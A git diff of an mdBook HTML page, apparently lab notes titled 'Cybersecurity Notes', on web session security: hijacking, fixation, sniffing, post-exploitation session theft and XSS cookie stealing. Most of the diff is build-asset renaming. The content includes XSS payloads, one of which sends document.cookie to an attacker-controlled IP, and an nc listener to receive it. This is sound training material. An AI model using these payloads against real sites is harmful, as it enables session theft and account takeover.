@@ -12,22 +12,22 @@
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="theme-color" content="#ffffff">
 
-        <link rel="shortcut icon" href="../../../favicon.png">
-        <link rel="stylesheet" href="../../../css/variables.css">
-        <link rel="stylesheet" href="../../../css/general.css">
-        <link rel="stylesheet" href="../../../css/chrome.css">
+        <link rel="shortcut icon" href="../../../favicon-7514936c.png">
+        <link rel="stylesheet" href="../../../css/variables-8adf115d.css">
+        <link rel="stylesheet" href="../../../css/general-2459343d.css">
+        <link rel="stylesheet" href="../../../css/chrome-ae938929.css">
+        <link rel="stylesheet" href="../../../css/print-9e4910d8.css" media="print">
 
         <!-- Fonts -->
-        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
-        <link rel="stylesheet" href="../../../fonts/fonts.css">
+        <link rel="stylesheet" href="../../../fonts/fonts-9644e21d.css">
 
         <!-- Highlight.js Stylesheets -->
-        <link rel="stylesheet" id="highlight-css" href="../../../highlight.css">
-        <link rel="stylesheet" id="tomorrow-night-css" href="../../../tomorrow-night.css">
-        <link rel="stylesheet" id="ayu-highlight-css" href="../../../ayu-highlight.css">
+        <link rel="stylesheet" id="mdbook-highlight-css" href="../../../highlight-493f70e1.css">
+        <link rel="stylesheet" id="mdbook-tomorrow-night-css" href="../../../tomorrow-night-4c0ae647.css">
+        <link rel="stylesheet" id="mdbook-ayu-highlight-css" href="../../../ayu-highlight-3fdfc3ac.css">
 
         <!-- Custom theme stylesheets -->
-        <link rel="stylesheet" href="../../../theme/pagetoc.css">
+        <link rel="stylesheet" href="../../../theme/custom-81a920ab.css">
 
 
         <!-- Provide site root and default themes to javascript -->
@@ -35,10 +35,10 @@
             const path_to_root = "../../../";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "../../../searchindex.js";
+            window.path_to_searchindex_js = "../../../searchindex-6205a3f5.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="../../../toc.js"></script>
+        <script src="../../../toc-eceb7dc6.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -52,7 +52,7 @@
             </div>
         </div>
     </div>
-    <div id="body-container">
+    <div id="mdbook-body-container">
         <!-- Work around some values being stored in localStorage wrapped in quotes -->
         <script>
             try {
@@ -81,12 +81,12 @@
             html.classList.add("js");
         </script>
 
-        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+        <input type="checkbox" id="mdbook-sidebar-toggle-anchor" class="hidden">
 
         <!-- Hide / unhide sidebar before it is displayed -->
         <script>
             let sidebar = null;
-            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            const sidebar_toggle = document.getElementById("mdbook-sidebar-toggle-anchor");
             if (document.body.clientWidth >= 1080) {
                 try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                 sidebar = sidebar || 'visible';
@@ -101,78 +101,81 @@
             }
         </script>
 
-        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+        <nav id="mdbook-sidebar" class="sidebar" aria-label="Table of contents">
             <!-- populated by js -->
             <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
             <noscript>
                 <iframe class="sidebar-iframe-outer" src="../../../toc.html"></iframe>
             </noscript>
-            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+            <div id="mdbook-sidebar-resize-handle" class="sidebar-resize-handle">
                 <div class="sidebar-resize-indicator"></div>
             </div>
         </nav>
 
-        <div id="page-wrapper" class="page-wrapper">
+        <div id="mdbook-page-wrapper" class="page-wrapper">
 
             <div class="page">
-                <div id="menu-bar-hover-placeholder"></div>
-                <div id="menu-bar" class="menu-bar sticky">
+                <div id="mdbook-menu-bar-hover-placeholder"></div>
+                <div id="mdbook-menu-bar" class="menu-bar sticky">
                     <div class="left-buttons">
-                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
-                            <i class="fa fa-bars"></i>
+                        <label id="mdbook-sidebar-toggle" class="icon-button" for="mdbook-sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="mdbook-sidebar">
+                            <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M0 96C0 78.3 14.3 64 32 64H416c17.7 0 32 14.3 32 32s-14.3 32-32 32H32C14.3 128 0 113.7 0 96zM0 256c0-17.7 14.3-32 32-32H416c17.7 0 32 14.3 32 32s-14.3 32-32 32H32c-17.7 0-32-14.3-32-32zM448 416c0 17.7-14.3 32-32 32H32c-17.7 0-32-14.3-32-32s14.3-32 32-32H416c17.7 0 32 14.3 32 32z"/></svg></span>
                         </label>
-                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
-                            <i class="fa fa-paint-brush"></i>
+                        <button id="mdbook-theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="mdbook-theme-list">
+                            <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M371.3 367.1c27.3-3.9 51.9-19.4 67.2-42.9L600.2 74.1c12.6-19.5 9.4-45.3-7.6-61.2S549.7-4.4 531.1 9.6L294.4 187.2c-24 18-38.2 46.1-38.4 76.1L371.3 367.1zm-19.6 25.4l-116-104.4C175.9 290.3 128 339.6 128 400c0 3.9 .2 7.8 .6 11.6c1.8 17.5-10.2 36.4-27.8 36.4H96c-17.7 0-32 14.3-32 32s14.3 32 32 32H240c61.9 0 112-50.1 112-112c0-2.5-.1-5-.2-7.5z"/></svg></span>
                         </button>
-                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
-                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
-                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
-                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
-                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
-                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
-                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        <ul id="mdbook-theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-default_theme">Auto</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-ayu">Ayu</button></li>
                         </ul>
-                        <button id="search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="searchbar">
-                            <i class="fa fa-search"></i>
+                        <button id="mdbook-search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="mdbook-searchbar">
+                            <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M416 208c0 45.9-14.9 88.3-40 122.7L502.6 457.4c12.5 12.5 12.5 32.8 0 45.3s-32.8 12.5-45.3 0L330.7 376c-34.4 25.2-76.8 40-122.7 40C93.1 416 0 322.9 0 208S93.1 0 208 0S416 93.1 416 208zM208 352c79.5 0 144-64.5 144-144s-64.5-144-144-144S64 128.5 64 208s64.5 144 144 144z"/></svg></span>
                         </button>
                     </div>
 
                     <h1 class="menu-title">Cybersecurity Notes</h1>
 
                     <div class="right-buttons">
+                        <a href="../../../print.html" title="Print this book" aria-label="Print this book">
+                            <span class=fa-svg id="print-button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M128 0C92.7 0 64 28.7 64 64v96h64V64H354.7L384 93.3V160h64V93.3c0-17-6.7-33.3-18.7-45.3L400 18.7C388 6.7 371.7 0 354.7 0H128zM384 352v32 64H128V384 368 352H384zm64 32h32c17.7 0 32-14.3 32-32V256c0-35.3-28.7-64-64-64H64c-35.3 0-64 28.7-64 64v96c0 17.7 14.3 32 32 32H64v64c0 35.3 28.7 64 64 64H384c35.3 0 64-28.7 64-64V384zm-16-88c-13.3 0-24-10.7-24-24s10.7-24 24-24s24 10.7 24 24s-10.7 24-24 24z"/></svg></span>
+                        </a>
                         <a href="https://github.com/d41y/d41y.github.io" title="Git repository" aria-label="Git repository">
-                            <i id="git-repository-button" class="fa fa-github"></i>
+                            <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span>
                         </a>
 
                     </div>
                 </div>
 
-                <div id="search-wrapper" class="hidden">
-                    <form id="searchbar-outer" class="searchbar-outer">
+                <div id="mdbook-search-wrapper" class="hidden">
+                    <form id="mdbook-searchbar-outer" class="searchbar-outer">
                         <div class="search-wrapper">
-                            <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                            <input type="search" id="mdbook-searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="mdbook-searchresults-outer" aria-describedby="searchresults-header">
                             <div class="spinner-wrapper">
-                                <i class="fa fa-spinner fa-spin"></i>
+                                <span class=fa-svg id="fa-spin"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M304 48c0-26.5-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48s48-21.5 48-48zm0 416c0-26.5-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48s48-21.5 48-48zM48 304c26.5 0 48-21.5 48-48s-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48zm464-48c0-26.5-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48s48-21.5 48-48zM142.9 437c18.7-18.7 18.7-49.1 0-67.9s-49.1-18.7-67.9 0s-18.7 49.1 0 67.9s49.1 18.7 67.9 0zm0-294.2c18.7-18.7 18.7-49.1 0-67.9S93.7 56.2 75 75s-18.7 49.1 0 67.9s49.1 18.7 67.9 0zM369.1 437c18.7 18.7 49.1 18.7 67.9 0s18.7-49.1 0-67.9s-49.1-18.7-67.9 0s-18.7 49.1 0 67.9z"/></svg></span>
                             </div>
                         </div>
                     </form>
-                    <div id="searchresults-outer" class="searchresults-outer hidden">
-                        <div id="searchresults-header" class="searchresults-header"></div>
-                        <ul id="searchresults">
+                    <div id="mdbook-searchresults-outer" class="searchresults-outer hidden">
+                        <div id="mdbook-searchresults-header" class="searchresults-header"></div>
+                        <ul id="mdbook-searchresults">
                         </ul>
                     </div>
                 </div>
 
                 <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                 <script>
-                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
-                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
-                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                    document.getElementById('mdbook-sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('mdbook-sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#mdbook-sidebar a')).forEach(function(link) {
                         link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                     });
                 </script>
 
-                <div id="content" class="content">
+                <div id="mdbook-content" class="content">
                     <main>
                         <style>
 .mdbook-callouts {
@@ -414,7 +417,7 @@
 <h1 id="session-security"><a class="header" href="#session-security">Session Security</a></h1>
 <h2 id="intro"><a class="header" href="#intro">Intro</a></h2>
 <p>A user session can defined as a sequence of requests originating from the same client and the associated responses during a specific time period. Modern web apps need to maintain user sessions to keep track of information and status about each user. User sessions faciliate the assignment of access or authorization rights, localization settings, etc., while users interact with an app, pre, and post-authentication.</p>
-<p>Each HTTP request should carry all needed information for the server to act upon it appropriately, and the session state resides on the client's side only.</p>
+<p>Each HTTP request should carry all needed information for the server to act upon it appropriately, and the session state resides on the client’s side only.</p>
 <h3 id="session-identifier-security"><a class="header" href="#session-identifier-security">Session Identifier Security</a></h3>
 <p>A unique session identifier (<em>Session ID</em>) or token is the basis upon which user sessions are generated and distinguished.</p>
 <p>If an attacker obtains a session identifier, this can result in session hijacking, where the attacker can essentially impersonate the victim in the web app. A session identifier can be:</p>
@@ -424,19 +427,25 @@
 <li>predicted</li>
 <li>brute forced</li>
 </ul>
-<p>A session identifier's security level depends on its:</p>
+<p>A session identifier’s security level depends on its:</p>
 <ul>
 <li>Validity Scope (<em>a secure session identifier should be valid for one session only</em>)</li>
 <li>Randomnsess (<em>a secure session identifier should be generated through a robust number/string generation algorithm so that it cannot be predicted</em>)</li>
 <li>Validity Time (<em>a secure session identifier should expire after a certain amount of time</em>)</li>
 </ul>
-<p>A session identifier's security level also depends on the location where it is stored:</p>
-<div class="table-wrapper"><table><thead><tr><th>Location</th><th>Description</th></tr></thead><tbody>
+<p>A session identifier’s security level also depends on the location where it is stored:</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Location</th><th>Description</th></tr>
+</thead>
+<tbody>
 <tr><td>URL</td><td>if this is the case, the HTTP <em>Referer</em> header can leak a session identifier to other websites; in addition, browser history will also contain any session identifier stored in the URL</td></tr>
-<tr><td>HTML</td><td>if this is the case, the session identifier can be identified in both the browser's cache memory and any intermediate proxies</td></tr>
-<tr><td>sessionStorage</td><td>... is a browser storage feature introduced in HTML5; session identifiers stored in sessionStorage can be retrieved as long as the tab or the browser is open; in other words, sessionStorage data gets cleared when the <em>page session</em> ends; note that a page session survives over page reloads and restores</td></tr>
-<tr><td>localStorage</td><td>... is a browser storage feature introduced in HTML5; session identifiers stored in localStorage can be retrieved as long as localStorage does not get deleted by the user; this is because data stored within localStorage will not be deleted when the browser process is terminated, with the exception of "private browsing" or "incognito" sessions where data stored within localStorage are deleted by the time the last tab is closed</td></tr>
-</tbody></table>
+<tr><td>HTML</td><td>if this is the case, the session identifier can be identified in both the browser’s cache memory and any intermediate proxies</td></tr>
+<tr><td>sessionStorage</td><td>… is a browser storage feature introduced in HTML5; session identifiers stored in sessionStorage can be retrieved as long as the tab or the browser is open; in other words, sessionStorage data gets cleared when the <em>page session</em> ends; note that a page session survives over page reloads and restores</td></tr>
+<tr><td>localStorage</td><td>… is a browser storage feature introduced in HTML5; session identifiers stored in localStorage can be retrieved as long as localStorage does not get deleted by the user; this is because data stored within localStorage will not be deleted when the browser process is terminated, with the exception of “private browsing” or “incognito” sessions where data stored within localStorage are deleted by the time the last tab is closed</td></tr>
+</tbody>
+</table>
 </div>
 <h3 id="session-attacks"><a class="header" href="#session-attacks">Session Attacks</a></h3>
 <p>Can be:</p>
@@ -450,7 +459,7 @@
 <h2 id="session-attacks-1"><a class="header" href="#session-attacks-1">Session Attacks</a></h2>
 <h3 id="session-hijacking"><a class="header" href="#session-hijacking">Session Hijacking</a></h3>
 <p>In session hijacking attacks, the attacker takes advantage of insecure session identifiers, finds a way to obtain them, and uses them to authenticate to the server and impersonate the victim.</p>
-<p>An attacker can obtain a victim's session identifier using several methods, with the most common being:</p>
+<p>An attacker can obtain a victim’s session identifier using several methods, with the most common being:</p>
 <ul>
 <li>passive traffic sniffing</li>
 <li>XSS</li>
@@ -464,7 +473,7 @@
 <li>use Web Dev Tools</li>
 <li>look for cookie that can be session identifier</li>
 </ul>
-<p><img src="../../../images/session_security1.png" alt="session security 1" /></p>
+<p><img src="../../../images/session_security1.png" alt="session security 1"></p>
 <h5 id="part-2-simulate-an-attacker"><a class="header" href="#part-2-simulate-an-attacker">Part 2: Simulate an attacker</a></h5>
 <ul>
 <li>copy cookie</li>
@@ -472,9 +481,9 @@
 <li>insert copied cookie</li>
 <li>notice, you can log in without giving creds</li>
 </ul>
-<p><img src="../../../images/session_security2.png" alt="session security 2" /></p>
+<p><img src="../../../images/session_security2.png" alt="session security 2"></p>
 <h3 id="session-fixation"><a class="header" href="#session-fixation">Session Fixation</a></h3>
-<p>... occurs when an attacker can fixate a (<em>valid</em>) session identifier. The Attacker will then have to trick the victim into logging into the application using the aforementioned session identifier. If the victim does so, the attacker can proceed to a Session Hijacking attack.</p>
+<p>… occurs when an attacker can fixate a (<em>valid</em>) session identifier. The Attacker will then have to trick the victim into logging into the application using the aforementioned session identifier. If the victim does so, the attacker can proceed to a Session Hijacking attack.</p>
 <p>Such bugs usually occur when session identifiers are being accepted from URL Query Strings or Post Data.</p>
 <p>Such attacks are usually mounted in three stages:</p>
 <ol>
@@ -486,13 +495,13 @@
 <ol>
 <li>Session fixation identification</li>
 </ol>
-<p><img src="../../../images/session_fixation1.png" alt="session fixation 1" /></p>
-<p>If any value or a valid session identifier specified in the <code>token</code> parameter on the URL is propagated to the <code>PHPSESSID</code> cookie's value, you are probably dealing with a session fixation vuln.</p>
+<p><img src="../../../images/session_fixation1.png" alt="session fixation 1"></p>
+<p>If any value or a valid session identifier specified in the <code>token</code> parameter on the URL is propagated to the <code>PHPSESSID</code> cookie’s value, you are probably dealing with a session fixation vuln.</p>
 <ol start="2">
 <li>Session fixation exploitation attempt</li>
 </ol>
-<p><img src="../../../images/session_fixation2.png" alt="session fixation 2" /></p>
-<p>Notice that the <code>PHPSESSID</code> cookie's value is <code>IControlThisCookie</code>. You are dealing with a Session Fixation vuln. An attacker could send a URL similar to the above to a victim. If the victim logs into the application, the attacker could easily hijack their session since the session identifier is already known.</p>
+<p><img src="../../../images/session_fixation2.png" alt="session fixation 2"></p>
+<p>Notice that the <code>PHPSESSID</code> cookie’s value is <code>IControlThisCookie</code>. You are dealing with a Session Fixation vuln. An attacker could send a URL similar to the above to a victim. If the victim logs into the application, the attacker could easily hijack their session since the session identifier is already known.</p>
 <h4 id="example-of-vulnerable-code"><a class="header" href="#example-of-vulnerable-code">Example of vulnerable code</a></h4>
 <pre><code class="language-php">&lt;?php
     if (!isset($_GET["token"])) {
@@ -505,10 +514,10 @@
 </code></pre>
 <h3 id="obtaining-session-identifiers-without-user-interaction"><a class="header" href="#obtaining-session-identifiers-without-user-interaction">Obtaining Session Identifiers without User Interaction</a></h3>
 <h4 id="obtaining-session-identifiers-via-traffic-sniffing"><a class="header" href="#obtaining-session-identifiers-via-traffic-sniffing">Obtaining Session Identifiers via Traffic Sniffing</a></h4>
-<p>Traffic Sniffing is something that most penetration testers do when asessing a network's security from the inside. It requires the attacker and the victim to be on the same local network. Then and only then can HTTP traffic be inspected by the attacker. It is impossible to perform traffic sniffing remotely.</p>
+<p>Traffic Sniffing is something that most penetration testers do when asessing a network’s security from the inside. It requires the attacker and the victim to be on the same local network. Then and only then can HTTP traffic be inspected by the attacker. It is impossible to perform traffic sniffing remotely.</p>
 <ol>
 <li>
-<p>Obtain the victim's cookie through packet analysis</p>
+<p>Obtain the victim’s cookie through packet analysis</p>
 <ol>
 <li>inside Wireshark, first, apply to see only HTTP traffic</li>
 <li>now search within the Packet bytes for any <code>auth-session</code> cookies</li>
@@ -521,15 +530,15 @@
 </ol>
 </li>
 <li>
-<p>Hijack the victim's session</p>
+<p>Hijack the victim’s session</p>
 <ol>
-<li>back on the browser and change the current cookie's value into the obtained value</li>
+<li>back on the browser and change the current cookie’s value into the obtained value</li>
 <li>refresh page</li>
 </ol>
 </li>
 </ol>
 <h4 id="obtaining-session-identifiers-post-exploitation"><a class="header" href="#obtaining-session-identifiers-post-exploitation">Obtaining Session Identifiers Post-Exploitation</a></h4>
-<p>During the post-exploitation phase, session identifiers and session data can be retrieved from either a web server's disk or memory.</p>
+<p>During the post-exploitation phase, session identifiers and session data can be retrieved from either a web server’s disk or memory.</p>
 <h5 id="php"><a class="header" href="#php">PHP</a></h5>
 <p>The entry <code>session.save_path</code> in <code>PHP.ini</code> specifies where session data will be stored.</p>
 <pre><code class="language-bash">d41y@htb[/htb]$ locate php.ini
@@ -537,20 +546,20 @@ d41y@htb[/htb]$ cat /etc/php/7.4/cli/php.ini | grep 'session.save_path'
 d41y@htb[/htb]$ cat /etc/php/7.4/apache2/php.ini | grep 'session.save_path'
 </code></pre>
 <p>A default config could store session data in <code>/var/lib/php/sessions</code> and could look like this:</p>
-<p><img src="../../../images/session_no_interaction_1.png" alt="session no interaction 1" /></p>
+<p><img src="../../../images/session_no_interaction_1.png" alt="session no interaction 1"></p>
 <p>The same PHP session identifier could look like this on a local setup:</p>
 <pre><code class="language-bash">d41y@htb[/htb]$ ls /var/lib/php/sessions
 d41y@htb[/htb]$ cat //var/lib/php/sessions/sess_s6kitq8d3071rmlvbfitpim9mm
 </code></pre>
-<p><img src="../../../images/session_no_interaction_2.png" alt="session no interaction 2" /></p>
+<p><img src="../../../images/session_no_interaction_2.png" alt="session no interaction 2"></p>
 <p>For a hacker to hijack the user session related to the session identifier above, a new cookie must be created in the web browser with the following values:</p>
 <ul>
 <li>cookie name: PHPSESSID</li>
 <li>cookie value: s6kitq8d3071rmlvbfitpim9mm</li>
 </ul>
 <h5 id="java"><a class="header" href="#java">Java</a></h5>
-<p>"The Manager element represents the session manager that is used to create and maintain HTTP sessions of a web application.</p>
-<p>Tomcat provides two standard implementations of Manager. The default implementation stores active sessions, while the optional one stores active sessions that have been swapped out in a storage location that is selected via the use of an appropriate <code>Store</code> nested element. The filename of the default session data file is <code>SESSIONS.ser</code>."</p>
+<p>“The Manager element represents the session manager that is used to create and maintain HTTP sessions of a web application.</p>
+<p>Tomcat provides two standard implementations of Manager. The default implementation stores active sessions, while the optional one stores active sessions that have been swapped out in a storage location that is selected via the use of an appropriate <code>Store</code> nested element. The filename of the default session data file is <code>SESSIONS.ser</code>.“</p>
 <p><a href="https://tomcat.apache.org/tomcat-6.0-doc/config/manager.html">More info here!</a></p>
 <h5 id="net"><a class="header" href="#net">.NET</a></h5>
 <p>Session data can be found in:</p>
@@ -567,12 +576,12 @@ use project;
 show tables;
 select * from users;
 </code></pre>
-<p><img src="../../../images/session_no_interaction_3.png" alt="session no interaction 3" /></p>
-<p>Here you can see the user's passwords are hashed. You could spend time trying to crack these; however, there is also a "all_sessions" table.</p>
+<p><img src="../../../images/session_no_interaction_3.png" alt="session no interaction 3"></p>
+<p>Here you can see the user’s passwords are hashed. You could spend time trying to crack these; however, there is also a “all_sessions” table.</p>
 <pre><code class="language-sql">select * from all_sessions;
 select * from all_sessions where id=3;
 </code></pre>
-<p><img src="../../../images/session_no_interaction_4.png" alt="session no interaction 4" /></p>
+<p><img src="../../../images/session_no_interaction_4.png" alt="session no interaction 4"></p>
 <p>Here you have successfully extracted the sessions!</p>
 <h3 id="xss"><a class="header" href="#xss">XSS</a></h3>
 <p>For an XSS attack to result in session cookie leakage, the following requirements must be fulfilled:</p>
@@ -581,7 +590,7 @@ select * from all_sessions where id=3;
 <li>Session cookies should be accessible by JS code</li>
 </ul>
 <h4 id="example-2"><a class="header" href="#example-2">Example</a></h4>
-<p><img src="../../../images/session_security_xss1.png" alt="xss 1" /></p>
+<p><img src="../../../images/session_security_xss1.png" alt="xss 1"></p>
 <p>In one field, you can specify the following payload:</p>
 <pre><code class="language-javascript">"&gt;&lt;img src=x onerror=prompt(document.domain)&gt;
 </code></pre>
@@ -589,16 +598,16 @@ select * from all_sessions where id=3;
 <p>In the remaining two fields, you specify the following two payloads.</p>
 <pre><code class="language-javascript">"&gt;&lt;img src=x onerror=confirm(1)&gt;
 </code></pre>
-<p>... and:</p>
+<p>… and:</p>
 <pre><code class="language-javascript">"&gt;&lt;img src=x onerror=alert(1)&gt;
 </code></pre>
-<p>You will need to update the profile by pressing "Save" to submit the payloads.</p>
-<p><img src="../../../images/session_security_xss2.png" alt="xss 2" /></p>
-<p>When successful, you notice no payload being triggered. Often the payload code is not going to be called/executed until another application functionality triggers it. Go to "Share", as it is the only other functionality you have, to see if any of the submitted payloads are retrieved in there. This functionality returns a publicly accessible profile. Identifying a stored XSS vuln in such a functionality would be ideal from an attacker's perspective.</p>
-<p><img src="../../../images/session_security_xss3.png" alt="xss 3" /></p>
+<p>You will need to update the profile by pressing “Save” to submit the payloads.</p>
+<p><img src="../../../images/session_security_xss2.png" alt="xss 2"></p>
+<p>When successful, you notice no payload being triggered. Often the payload code is not going to be called/executed until another application functionality triggers it. Go to “Share”, as it is the only other functionality you have, to see if any of the submitted payloads are retrieved in there. This functionality returns a publicly accessible profile. Identifying a stored XSS vuln in such a functionality would be ideal from an attacker’s perspective.</p>
+<p><img src="../../../images/session_security_xss3.png" alt="xss 3"></p>
 <p>Checking if HTTPOnly flag is set:</p>
-<p><img src="../../../images/session_security_xss4.png" alt="xss 4" /></p>
-<p>... and it's turned off.</p>
+<p><img src="../../../images/session_security_xss4.png" alt="xss 4"></p>
+<p>… and it’s turned off.</p>
 <h5 id="obtaining-session-cookie-through-xss"><a class="header" href="#obtaining-session-cookie-through-xss">Obtaining session cookie through XSS</a></h5>
 <p>You identified that you could create and share publicly accessible profiles that contain your specified XSS payloads.</p>
 <p>The below PHP script can be hosted on a VPS to log cookies:</p>
@@ -637,7 +646,7 @@ exit;
 [Thu Jun  5 16:54:23 2025] 10.10.15.211:43776 Closing
 </code></pre>
 <h5 id="obtaining-session-cookies-through-xss-netcat-edition"><a class="header" href="#obtaining-session-cookies-through-xss-netcat-edition">Obtaining session cookies through XSS (Netcat edition)</a></h5>
-<p>First, you need to place the payload into the vulnerable field and click "Save".</p>
+<p>First, you need to place the payload into the vulnerable field and click “Save”.</p>
 <p>Payload:</p>
 <pre><code class="language-javascript">&lt;h1 onmouseover='document.write(`&lt;img src="http://&lt;VPN/TUN Adapter IP&gt;:8000?cookie=${btoa(document.cookie)}"&gt;`)'&gt;test&lt;/h1&gt;
 </code></pre>
@@ -645,7 +654,7 @@ exit;
 <pre><code class="language-bash">d41y@htb[/htb]$ nc -nlvp 8000
 listening on [any] 8000 ...
 </code></pre>
-<p>Simulating the victim and navigating to the shared profile of Ela, brings you the cookie when the victim hovers over "test":</p>
